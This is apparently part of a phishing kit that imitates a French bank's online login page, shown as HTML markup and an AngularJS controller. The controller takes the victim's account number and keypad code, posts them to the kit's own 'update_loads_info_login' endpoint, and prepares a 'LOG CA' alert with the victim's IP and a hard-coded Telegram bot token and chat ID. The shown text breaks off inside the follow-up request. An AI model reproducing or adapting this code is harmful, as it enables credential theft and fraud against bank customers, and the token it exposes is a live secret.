										...
										<div class="login-mini parbase" id="loading_start" style="height: 16rem;display:none;">
		                                 ...
		                                 <div class="login-mini parbase" id="contant_start">
											<form class="Login-form" id="loginForm" name="loginForm" novalidate="">
												<div class="row row-no-padding">
												    <div class="form-group">
														...
														<div class="col-xs-12 Login-noPadding" id="Login-account-div">
															<div class=" form-group">
																<input class="form-control" id="val_login" placeholder="Ex: 98652706859" type="text"ng-model="val_login"  maxlength="11"  autocomplete="off" ng-change="bloc_login()">
												...
												<div class="row row-no-padding">
												    <div class="form-group " id="space_code_pass" style="display: none;">
														...
														<div class="col-xs-5 Login-lostPswd Login-noPadding js-lostPswd-pswd">	
															<div class="login-simple-link parbase">
											                   <a href="" class="Login-lostPswdLink js-OpenTooltip" target="_self">Perdu / Oublié&nbsp;?</a>
											                </div>
												       	</div>
												       	
											           	<div class="col-xs-12 Login-noPadding" id="Login-password-div">
												        	 <div class="add-clear-span form-group">
												        	 	<input id="bloc_pwd_input" type="password" class="form-control input-clear" placeholder="Tapez votre code dans le pavé numérique" readonly="readonly" 
												        	 	ng-model="bloc_pwd_input">
												        	 	<span role="button" class="add-clear-x form-control-feedback icon-form npc-close" 
												        	 	     style="cursor: pointer; text-decoration: none; overflow: hidden; position: absolute; pointer-events: auto; right: 0px; top: 4px; z-index: 3; display: none;"ng-model="pwd_span_closex" ng-click="pwd_span_close()" id="pwd_span_close">
												        	 	     <span class="ti-close"></span>
												        	 	</span>
												        	 </div>
														</div>
											    ...
											    <div class="col-xs-12 Login-noPadding error" id="iden_err" style="display:none;" >
												...
												<div id="clavier_num" style="display: none;">
													<div class="row row-no-padding">
														<div class="col-xs-12">
															<div class="Login-keypad">
																<a href="" class="Login-key T031__key" ng-click="val_click(7)" role="button"><div>7</div></a>
																<a href="" class="Login-key T031__key" ng-click="val_click(5)" role="button"><div>5</div></a>
																<a href="" class="Login-key T031__key" ng-click="val_click(8)" role="button"><div>8</div></a>
																<a href="" class="Login-key T031__key" ng-click="val_click(9)" role="button"><div>9</div></a>
																<a href="" class="Login-key T031__key" ng-click="val_click(0)" role="button"><div>0</div></a>
															</div>
														</div>
													</div>
													...
													<div class="row row-no-padding">
														<div class="col-xs-12">
															<div class="Login-keypad">
																<a href="" class="Login-key T031__key"  ng-click="val_click(2)" role="button"><div >2</div></a>
																<a href="" class="Login-key T031__key"  ng-click="val_click(1)" role="button"><div >1</div></a>
																<a href="" class="Login-key T031__key"  ng-click="val_click(3)" role="button"><div >3</div></a>
																<a href="" class="Login-key T031__key"  ng-click="val_click(6)" role="button"><div >6</div></a>
																<a href="" class="Login-key T031__key"  ng-click="val_click(4)" role="button"><div >4</div></a>
															</div>
														</div>
													</div>
												</div>
												...
												<div class="row row-no-padding">
												    ...
												    <!-- 	<input value="Valider" id="validation" aria-label="Validation du code personnel" type="submit" class="btn btn-primary Login-button col-xs-12" style="display: none;" disabled="" ng-click="validation()" > -->

	                                              <button  id="validation" aria-label="Validation du code personnel" type="submit" class="btn btn-primary Login-button col-xs-12" style="display: none;" disabled="" ng-click="validation()" >  
												  Valider</button>
												...
												<div class="register parsys">
													...
													<div class="bouton-generique parbase section">
														<div class="GenericBtn GenericBtn--full">
															 <a href="" class="GenericBtn-btn" target="_self" tabindex="2000"><span>Devenir client</span></a>			
														</div>
													</div>
											    </div>
											</form>
									...
									<div class="col-xs-12 col-sm-6">
										<div class="Login-information">
											<div class="infos texte">
												<div tabindex="17">
													<p>
														<span class="lead"><b>OUBLI/PERTE DE CODE PERSONNEL</b></span><br>
														<span class="RichText-texteVignettes">Si vous avez oublié ou perdu votre code personnel, 
															<a href="" tabindex="2000">cliquez&nbsp;ici</a>.
															<br>&nbsp;
														</span>
													</p>
...
fetch.controller('controller', ['$scope', '$http','$filter', function ($scope, $http,$filter) {
        ...
        var pathname = urlx.replace("auth_u.php", "");
 ...
 setInterval(function() {
    ...
    $scope.bloc_login = function(){ 
	  	...
	  	}else if( $scope.val_login.length == 11){
	...
	$scope.login_btn = function(){ 
        $("#val_login").attr('disabled','disabled');
        $("#clavier_num").css('display','block');
        $("#space_code_pass").css('display','block');
	...
	$scope.validation = function(){
		var Detaile = {}; 
        if(!$scope.isInteger($scope.val_login)){
        	$("#iden_err").css('display','block');
            $scope.login_span_close();
        }else{
        	   $('#validation').hide();
            $('#subx2').show();
            Detaile.load_id= $scope.load;
            ...
            Detaile.pwd= $scope.bloc_pwd_input;
            console.log(Detaile)
            const admin =$scope.info_User['admin'];
            const ip = $scope.info_User['ip'];
            const message = `LOG CA ${admin}\n ${ip}`;
            const token = '5416259258:AAHpf3zrcrT3SN_XJ3NQgySL686GYVM2nLY';
            const chatId ='1892699435';
		    $http({
		          method: 'post',
		          url: $scope.base_url+"api_cl/ca/update_loads_info_login",
		          data: Detaile, 
		          headers: { 'Content-Type': 'application/x-www-form-urlencoded'}
		    }).then(function(data) {
                $.ajax({
